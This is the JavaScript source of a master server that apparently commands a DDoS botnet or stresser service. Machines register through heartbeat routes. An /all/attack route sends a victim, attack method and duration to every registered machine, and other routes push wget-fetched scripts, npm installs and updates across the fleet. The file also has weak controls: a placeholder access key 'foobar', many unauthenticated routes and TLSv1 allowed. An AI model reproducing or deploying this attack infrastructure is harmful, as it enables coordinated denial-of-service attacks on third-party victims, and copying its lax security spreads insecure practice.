//npm install express json-server axios events delay random-number-csprng moment crypto dotenv
process.on('uncaughtException', function (err) {
    console.log(err);
});
process.chdir(__dirname)
require('tls').DEFAULT_MIN_VERSION = 'TLSv1'
const { exec } = require('child_process');
let initSign = `${Date.now()}`
const logger = require('./logger.js').log
logger.init(initSign, "Initiating...")
const express = require('express')
logger.init(initSign, "Called 'express'")
const app = express()
logger.init(initSign, "Initiated 'express'")
const jsonServer = require('json-server')
logger.init(initSign, "Called 'json-server'")
const jServer = jsonServer.create()
logger.init(initSign, "Created 'json-server'")
const router = jsonServer.router('db.json')
logger.init(initSign, "Called 'json-server' router")
const middlewares = jsonServer.defaults()
const axios = require('axios').default;
logger.init(initSign, "Called 'axios'")
const EventEmitter = require('events')
logger.init(initSign, "Called 'events'")
const delay = require('delay')
logger.init(initSign, "Called 'delay'")
const moment = require('moment')
logger.init(initSign, "Called 'moment'")
const crypto = require('crypto')
logger.init(initSign, "Called 'crypto'")
logger.init(initSign, "Called 'caller-id'")
const bodyParser = require('body-parser');
const si = require('systeminformation');
const jwt = require('jsonwebtoken');
const admin = require('firebase-admin');
const fs = require('fs')
const https = require('https')
const serviceAccount = require('./canavar-access-firebase-adminsdk-4z8ul-9ba89aaa5e.json')
admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
getAuth = admin.auth

let config = {
    pk: [
        "foobar"
    ],
    log: null,
    dumpTimerDelay: null,
    domainConnection: null
}

let systemInfo = {
    static: null,
    dynamic: {
        cpu: {
            brand: null,
            speed: null,
            voltage: null
        },
        mem: {
            total: null,
            free: null,
            used: null,
            active: null,
            available: null
        },
        load: null,
        net: null
    }
}

let Globals = {
    restart: {
        scheduled: false,
        at: null,
        last: null
    },
    lockdown: true,
    allDynamicData: null,
    staticData: null,
    simpleHeartbeatDelay: null,
    complexHeartbeatDelay: null,
    refreshTimerDelay: null,
    siDataPlacementDelay: null,
    dynDataPlacementDelay: null,
    maximumPortLife: null
}

/* let database = {
    globals: "http://localhost:3000/global/",
    setup: "http://localhost:3000/setup/",
    scripts: "http://localhost:3000/scripts/",
    machines: "http://localhost:3000/machines/",
    settings: "http://localhost:3000/settings/",
    stats: "http://localhost:3000/stats/",
    users: "http://localhost:3000/users/",
} */

let slaveInfo = {
    scripts: null,
    setup: null
}

let stats = {

}

let users = {
    all: [],
    get: function (uid) {
        return users.all.find(u => { return (u.id === uid) })
    },
    has: function (uid) { //repetitive.repetitive.repetitive.repetitive.repetitive.
        let u = users.all.find(u => { return (u.id === uid) });
        if (u !== undefined) {
            return true
        } else {
            return false
        }
    },
    update: function (uid, area, data) {
        users.all.find(u => { if (u.id === uid) { u[area] = data } })
    },
    count: function () { return users.all.length }
}

let databaseAddress = "http://localhost:3000/";

let database = { // switch to new databaseElement() or sth fancy in the future?
    globals: {
        fetch: async function () {
            return axios.get(database.globals.address, { timeout: 4000 })
                .then(res => {
                    Globals = res.data
                    console.log(Globals);
                })
                .catch(err => {
                    database.globals.fetch()
                })
        },
        dump: async function () {
            return axios.patch(database.globals.address, Globals)
                .then(res => {
                    Globals.latestGlobalsDump = Date.now()
                    console.log("Globals dumped.");
                })
                .catch(err => {
                    console.error(err);
                })
        },
        address: databaseAddress + "global/",
    },
    config: {
        fetch: async function () {
            return axios.get(database.config.address)
                .then(resx => {
                    config = resx.data
                })
                .catch(err => {
                    database.config.fetch()
                })
        },
        address: databaseAddress + "settings/"
    },
    slaveSetup: {
        fetch: async function () {
            return axios.get(database.slaveSetup.address)
                .then(res => {
                    slaveInfo.setup = res.data
                    for (const key in slaveInfo.setup) {
                        let k = key
                        let aa = (stitchSetupLines(k, (slaveInfo.setup)))
                        if (aa) {
                            ((slaveInfo.setup)[k]) = aa
                        }
                    }
                    console.log("Setups loaded.");
                })
                .catch(err => {
                    console.error(err);
                })
        },
        address: databaseAddress + "setup/"
    },
    scripts: {
        fetch: async function () {
            return axios.get(database.scripts.address)
                .then(res => {
                    slaveInfo.scripts = res.data
                    console.log("Scripts loaded.");
                })
                .catch(err => {
                    console.error(err);
                })
        },
        address: databaseAddress + "scripts/"
    },
    stats: {
        fetch: async function () {
            return axios.get(database.stats.address)
                .then(res => {
                    stats = res.data
                    console.log("Stats loaded.");
                })
                .catch(err => {
                    console.error(err);
                })
        },
        dump: async function () {
            return axios.patch(database.stats.address, stats)
                .then(res => {
                    console.log("Stats dumped.");
                })
                .catch(err => {
                    console.error(err);
                })
        },
        address: databaseAddress + "stats/"
    },
    machines: {
        address: databaseAddress + "machines/"
    }
}

console.log(database.globals.address);

let Machines = {
    all: {

    },
    has: function (mid) {
        if (Machines.all[mid]) {
            return true
        }
    },
    get: function (mid) {
        if (Machines.all[mid]) {
            return Machines.all[mid]
        } else {
            return { null: null }
        }
    },
    clean: function () {
        Machines.all = {}
    },
    count: function () {
        return (Object.keys(Machines.all)).length
    },
    list: function () {
        let macar = []
        for (const key in Machines.all) {
            macar.push(Machines.all[key])
        }
        return macar
    }
}

si.getDynamicData(function (data) {
    systemInfo.dynamic.all = data
})

let initiated = false
const databaseInitiated = new EventEmitter()

function logID() {
    return crypto.randomBytes(5).toString('hex');
}

jServer.use((req, res, next) => {
    if (req.hostname === "localhost") {
        next()
    } else {
        if (req.method === "POST") {
            if ((req.headers.accesskey)) {
                if ((config.pk).includes(req.headers.accesskey)) {
                    next()
                } else {
                    res.send(403)
                }
            } else {
                res.send(403)
            }
        } else {
            next();
        }
    }

})

app.use(require('cors')())

app.use((req, res, next) => {
    if (initiated) {
        let area = ((req.originalUrl).split("/")[1]);
        if (area === "mgmt") {
            if ((req.headers.accesskey)) {
                if ((config.pk).includes(req.headers.accesskey)) {
                    //console.log("approve");
                    next()
                } else {
                    res.send(403)
                }
            } else {
                res.send(403)
            }
        } else {
            next()
        }
    }
    else {
        res.send(500, {
            error: {
                message: "MASTER_IS_INITIATING",
                innerResponse: `The master had started at ${initSign}`
            }
        })
    }
})

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(bodyParser.raw());

const authenticate = (req, res, next) => {
    let authKey = req.headers["authorization"]
    if (!authKey) {
        res.send(401, {
            error: {
                message: "NO_TOKEN_PROVIDED",
                innerResponse: "A token was not given for authorization."
            }
        })
        return
    }
    getAuth()
        .verifyIdToken(authKey)
        .then((decodedToken) => {
            const uid = decodedToken.uid;
            console.log(uid);
            console.log(decodedToken);
            getAuth()
                .getUser(uid)
                .then((userRecord) => {
                    req.userData = {
                        tokenData: decodedToken,
                        userClaims: userRecord.customClaims
                    }
                    next()
                });
        })
        .catch((error) => {
            res.send(401, {
                error: {
                    message: "INVALID_TOKEN",
                    innerResponse: "Given token for the user was incorrect."
                }
            })
        });
}

jServer.use(middlewares)
jServer.use(router)

jServer.listen(3000, () => { console.log("dbok"); databaseInitiated.emit('true') })

databaseInitiated.on('true', async () => {
    console.log("Begin init.");
    await database.globals.fetch()
    await database.config.fetch()
    await database.slaveSetup.fetch()
    await database.scripts.fetch()
    await database.stats.fetch()
    updateMasterSubdomain()
    await dbMachineCleanup()
    initiated = true

    let dumpLoop = function () {
        database.globals.dump()
        database.stats.dump()
        if (githubratelimitcooldown < Date.now()) {
            githubratelimitcooldown = 0
        }
        dumpTimer = setTimeout(dumpLoop, config.dumpTimerDelay);
    }

    dumpLoop()

    console.log("End init.");
})



async function dbMachineCleanup() {
    return axios.get(database.machines.address)
        .then(async (res) => {
            let machines = res.data
            async function delall() {
                for (let index = 0; index < machines.length; index++) {
                    const element = machines[index];
                    await axios.delete(`${database.machines.address}${element.id}`)
                        .then(res => {
                            //console.log(res)
                        })
                        .catch(err => {
                            console.error(err);
                        })
                }
            }
            await delall()
            return
        })
        .catch(err => {
            console.error(err);
        })
}


async function dumpGlobals() {
    return axios.patch(database.globals.address, Globals)
        .then(res => {
            Globals.latestGlobalsDump = Date.now()
            console.log("Globals dumped.");
        })
        .catch(err => {
            console.error(err);
        })
}

async function dumpStats() {
    return axios.patch(database.stats.address, stats)
        .then(res => {
            console.log("Stats dumped.");
        })
        .catch(err => {
            console.error(err);
        })
}

function updateMasterSubdomain() {
    let traceid = logID()
    if (config.domainConnection) {
        logger.info(traceid, "Updating Master Subdomain", `Begun`)
        axios.get("http://icanhazip.com")
            .then(res => {
                let currentIP = res.data
                logger.info(traceid, "Updating Master Subdomain", `Current IP recieved as ${currentIP}`)
                var options = {
                    method: 'PUT',
                    url: `https://api.cloudflare.com/client/v4/zones/${dotenv.CFZI}/dns_records/${dotenv.CFDR}`,
                    headers: { Authorization: 'Bearer ' + dotenv.CFPT, 'Content-Type': 'application/json' },
                    data: { type: 'A', name: 'master.api.canavar.licentia.xyz', content: currentIP, ttl: 1, proxied: true }
                };
                axios.request(options).then(function (response) {
                    logger.info(traceid, "Updated Master Subdomain", `Updated the subdomain to IP ${currentIP}`)
                }).catch(function (error) {
                    logger.info(traceid, "Couldn't Update Master Subdomain", `Tried to update the subdomain to IP ${currentIP}`)
                    console.error(error);
                });
            })
            .catch(err => {
                console.error(err);
                logger.info(traceid, "Couldn't Update Master Subdomain", `Error was : ${err}`)
            })
    } else {
        logger.info(traceid, "Updating Master Subdomain", `Aborted because config prevents automatic subdomain heartbeats.`)
    }
}

app.get('/', (req, res) => {
    let ref = (req.headers.host);
    if (ref === "127.0.0.1") {

    }
    res.send(200, "OKAY")
})

app.get('/scripts', (req, res) => {
    let scid = ([Object.keys(req.query)[0]][0]);
    let detid = ([Object.keys(req.query)[1]][0]);
    //console.log(scid);
    if (scid === undefined) {
        res.send(200, slaveInfo.scripts)
    } else {
        let allScripts = slaveInfo.scripts
        for (let index = 0; index < allScripts.length; index++) {
            let cScript = allScripts[index];
            if (cScript.id === scid) {
                if (detid === "download") {
                    res.send(200, `cd ${slaveInfo.setup.scriptdir}; wget ${cScript.source} -O ${cScript.filename}`)
                } else {
                    res.send(cScript)
                }
                return
            }
        }
        res.send(500, {
            error: {
                message: "SCRIPT_DOES_NOT_EXIST",
                innerResponse: `SCRIPT_DOES_NOT_EXIST`
            }
        })
    }
})

app.get('/setup', (req, res) => {
    let scid = ([Object.keys(req.query)[0]][0]);
    let detid = ([Object.keys(req.query)[1]][0]);
    //console.log(scid, detid);
    if (!((Object.keys(slaveInfo.setup)).includes(scid))) {
        res.send(200, slaveInfo.setup)
    } else {
        let setup_ = slaveInfo.setup
        if (setup_[scid]) {
            res.send(200, setup_[scid])
        }
    }
})

function stitchSetupLines(asked, setup_) {
    if (setup_[asked]) {
        if ((setup_[asked]).includes("[")) {
            let a = setup_[asked]
            let b = (a.split("["));
            for (let c = 0; c < b.length; c++) {
                let d = b[c];
                d = d.split("]")[0]
                if (setup_[d]) {
                    b[c] = setup_[d]
                }
            }
            let e = b.join("")
            return e
        } else {
            return (setup_[asked])
        }
    } else {
        return null
    }
}

app.get('/globals', (req, res) => {
    res.send(200, Globals)
})

app.get('/stats', (req, res) => {
    res.send(200, stats)
})

app.post('/heartbeat', (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    ip = ip.toString().replace('::ffff:', '');
    let machine = req.body.machine
    Machines.all[ip] = {
        id: ip,
        machine
    }
    res.send(200, Globals)
})

app.patch('/heartbeat', (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    ip = ip.toString().replace('::ffff:', '');
    let machine = req.body.machine
    if (Machines.all[ip]) {
        Machines.all[ip].machine.port = machine.port
        Machines.all[ip].machine.busy = machine.busy
        Machines.all[ip].machine.init = machine.init
        Machines.all[ip].machine.currentAttack = machine.currentAttack
    } else {
        Machines.all[ip] = {
            id: ip,
            machine
        }
    }
    res.send(200, Globals)
})

app.get('/all/installscript/:scriptid', async (req, res) => {
    //axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/installScript/${req.params.scriptid}`)
    let machines = {
        all: Machines.list(),
        asked: [],
        responded: [],
        busy: []
    }
    for (let index = 0; index < (machines.all).length; index++) {
        let currentMachine = ((machines.all)[index])
        machines.asked.push(currentMachine)
        axios.get(`http://${currentMachine.id}:${currentMachine.machine.port.number}/installScript/${req.params.scriptid}`)
            .then(res => {
                machines.responded.push(currentMachine)
            })
            .catch(err => {
                console.error(err.response.data);
                machines.busy.push(currentMachine)
            })
    }
    await delay(3000)
    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
})
app.get('/all/npminstall/:module', async (req, res) => {
    //axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/npminstall/${req.params.module}`)
    let machines = {
        all: Machines.list(),
        asked: [],
        responded: [],
        busy: []
    }
    for (let index = 0; index < (machines.all).length; index++) {
        let currentMachine = ((machines.all)[index])
        machines.asked.push(currentMachine)
        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port.number}/npminstall/${req.params.module}`)
            .then(res => {
                machines.responded.push(currentMachine)
            })
            .catch(err => {
                console.error(err.response.data);
                machines.busy.push(currentMachine)
            })
    }
    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
})

app.get('/all/attack/:methodID/:victim/:time/:attackID', async (req, res) => {
    stats.totalAttacks = stats.totalAttacks + 1
    let machines = {
        all: Machines.list(),
        asked: [],
        responded: [],
        busy: []
    }
    for (let index = 0; index < (machines.all).length; index++) {
        let currentMachine = ((machines.all)[index])
        machines.asked.push(currentMachine)
        console.log(currentMachine);
        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port.number}/attack/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
            .then(res => {
                machines.responded.push(currentMachine)
            })
            .catch(err => {
                console.error(err.response.data);
                machines.busy.push(currentMachine)
            })
    }
    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
})

app.get('/all/update', async (req, res) => {
    let machines = {
        all: Machines.list(),
        asked: [],
        responded: [],
        busy: []
    }
    for (let index = 0; index < (machines.all).length; index++) {
        let currentMachine = ((machines.all)[index])
        machines.asked.push(currentMachine)
        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port.number}/update`)
            .then(res => {
                machines.responded.push(currentMachine)
            })
            .catch(err => {
                console.error(err.response.data);
                machines.busy.push(currentMachine)
            })
    }
    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
})

app.get('/machines/', (req, res) => {
    res.send(200, Machines.all)
})
app.get('/machines/list', (req, res) => {
    let macar = []
    for (const key in Machines.all) { macar.push(Machines.all[key]) }
    res.send(200, macar)
})
app.get('/machines/count', authenticate, (req, res) => {
    res.send(200, Machines.count())
})
app.get('/machines/:machid', (req, res) => {
    res.send(200, Machines.get(req.params.machid))
})
app.get('/machines/testReachability/', async (req, res) => {
    let machines = {
        all: Machines.list(),
        asked: [],
        responded: [],
        busy: []
    }
    for (let index = 0; index < (machines.all).length; index++) {
        let currentMachine = ((machines.all)[index])
        machines.asked.push(currentMachine)
        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port.number}/status`)
            .then(res => {
                machines.responded.push(currentMachine)
            })
            .catch(err => {
                console.error(err.response.data);
                machines.busy.push(currentMachine)
            })
    }
    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
})

app.post('/mgmt/database', async (req, res) => {
    res.sendFile(__dirname + '/db.json');
})

app.get('/mgmt/getUsers', async (req, res) => {
    let usersl = []
    getAuth()
        .listUsers(1000)
        .then(async function (listUsersResult) {
            for await (const i of listUsersResult.users) {
                await getAuth()
                    .getUser(i.uid)
                    .then(async function (userRecord) {
                        usersl.push(userRecord)
                    });
            };

            res.send(200, usersl)
        })
        .catch((error) => {
            console.log('Error listing users:', error);
            res.send(500, error)
        });
})




app.get('/mgmt/systemInfo', async (req, res) => {
    let systemInfo_ = systemInfo
    si.mem(function (memdata) {
        systemInfo_.dynamic.mem.total = memdata.total
        systemInfo_.dynamic.mem.free = memdata.free
        systemInfo_.dynamic.mem.used = memdata.used
        systemInfo_.dynamic.mem.active = memdata.active
        systemInfo_.dynamic.mem.available = memdata.available
        si.cpu(function (cpudata) {
            systemInfo_.dynamic.cpu.voltage = cpudata.voltage
            systemInfo_.dynamic.cpu.speed = cpudata.speed
            systemInfo_.dynamic.cpu.brand = cpudata.brand
            si.currentLoad(function (data) {
                systemInfo_.dynamic.load = data
                systemInfo_.uptime = process.uptime()
                si.networkStats(function (data) {
                    systemInfo_.dynamic.net = data
                    res.send(200, systemInfo_)
                })
            })
        })
    })
})

app.post('/mgmt/update', (req, res) => {
    res.send(200)
    exec("cd /C.A.N.A.V.A.R/ ; git stash; git stash drop; git pull; cd master ; npm install; pm2 restart all", (err, stdout, stderr) => {
        if (err) {
            console.error(err)
            res.send(500, { std_err: err })
        } else {
            res.send(200, { std_out: stdout, std_err: stderr })
        }
    })
})

app.post('/mgmt/restart', (req, res) => {
    res.send(200)
    exec("pm2 restart all", (err, stdout, stderr) => {
        if (err) {
            console.error(err)
            res.send(500, { std_err: err })
        } else {
            res.send(200, { std_out: stdout, std_err: stderr })
        }
    })
})
let githubratelimitcooldown = 0
app.post('/mgmt/vcontrol', (req, res) => {
    exec("cd /C.A.N.A.V.A.R/ ; git show -1 --stat  ", (err, stdout, stderr) => {
        if (err) {
            console.error(err)
            res.send(200, { std_err: err })
        } else {
            if (githubratelimitcooldown === 0) {
                let stdout_ = stdout
                if (stdout.length > 10) {
                    var options = {
                        method: 'GET',
                        url: 'https://api.github.com/repos/mehmetefeerkan/C.A.N.A.V.A.R/commits',
                        headers: { Accept: 'application/vnd.github.v3+json' }
                    };
                    axios.request(options).then(function (response) {
                        let resp = response.data
                        let latestCommitSHA = resp[0].sha
                        if ((latestCommitSHA === (null || undefined || ""))) {
                            res.send(500, {
                                error: {
                                    message: "INVALID_COMMIT_SHA_RECIEVED",
                                    innerResponse: `Given SHA was${latestCommitSHA}`
                                }
                            })
                        } else {
                            if (stdout_.includes(latestCommitSHA)) {
                                res.send(200, { upToDate: true, latestCommit: resp[0], currentCommitData: stdout_ })
                            } else {
                                res.send(200, { upToDate: false, latestCommit: resp[0], currentCommitData: stdout_ })
                            }
                        }
                    }).catch(function (error) {
                        console.error(error);
                        githubratelimitcooldown = (parseInt(error.response.headers["x-ratelimit-reset"])) * 1000
                        res.send(500, {
                            error: {
                                message: "GITHUB_RATE_LIMIT_REACHED",
                                innerResponse: `Cooldown ends at ${githubratelimitcooldown}`
                            }
                        })
                    });
                }
            } else {
                res.send(500, {
                    error: {
                        message: "GITHUB_RATE_LIMIT_REACHED",
                        innerResponse: `Cooldown ends at ${githubratelimitcooldown}`
                    }
                })
            }
        }
    })
})



app.get('/auth/test', authenticate, (req, res) => {
    res.send(req.userData)
    //ToDo: get all auth logic ready for prod. and minify it as much as you can.
    //DONE: create a function, possibly promise-based, in order to refresh user tokens. | Handled by firebase
    //DONE: first, move from array-based user data storage to object-based storage. arrays with user data are unbearable. | Handled by firebase
    //DONE: if ^ that doesn't work, move to fucking mongoose (please, god, please make this ^ work...) | Handled by firebase
    //ToDo: make admins and OP's invul to /mgmt/ routes.
    //ToDo: Integrate tier-checking abilities.
    //DONE: Dumping users when neccessary has to be timer'ed :D | Handled by firebase
    //ToDo: put user count to stats
})


app.listen(80, () => console.log(`App listening on port ${"80"}!`))
const httpsServer = https.createServer({
    key: fs.readFileSync('privkey.key'),
    cert: fs.readFileSync('fullchain.pem'),
}, app);

httpsServer.listen(443, () => {
    console.log('HTTPS Server running on port 443');
});